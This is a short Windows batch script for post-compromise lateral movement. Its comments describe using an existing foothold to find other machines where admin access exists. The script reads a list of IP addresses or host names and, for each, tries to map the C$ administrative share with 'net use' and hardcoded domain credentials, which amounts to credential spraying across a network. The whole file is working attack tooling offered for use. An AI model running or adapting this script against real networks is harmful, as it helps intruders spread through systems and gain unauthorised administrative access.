REM This simple batch script is designed for using an existing Windows foothold (with or without existing admin privileges) to search for other targets where admin access exists.
REM Improvements are on the way, but for now you'll have to hardcode the domain, username, and password.
set /p inputfile="Please specify an input file which has each IP address or DNS name on a separate line: "
for /F "tokens=*" %%A in (%inputfile%) do net use \\%%A\c$ /user:domain\username Password123 & net use
